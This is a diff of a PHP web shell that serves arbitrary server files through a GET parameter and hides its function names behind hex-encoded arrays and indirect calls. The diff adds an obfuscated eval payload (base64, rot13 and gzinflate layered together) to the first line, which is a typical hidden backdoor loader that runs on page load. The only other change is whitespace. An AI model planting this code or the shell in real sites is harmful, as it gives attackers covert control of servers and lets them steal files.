@@ -1,4 +1,4 @@
-<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 $Array = [
 		'7068705f756e616d65',
 		'70687076657273696f6e',
@@ -596,6 +596,6 @@ for($i=0;$i<$___;$i++) {
 		header("Content-Transfer-Encoding: Binary");
 		header("Content-Length: ".$GNJ[34](uhex($_GET["g"])));
 		header("Content-disposition: attachment; filename=\"".uhex($_GET["g"])."\"");
-		$GNJ[37](uhex($_GET["g"]));
+		$GNJ[37](uhex($_GET["g"])); 
 	}
 ?>
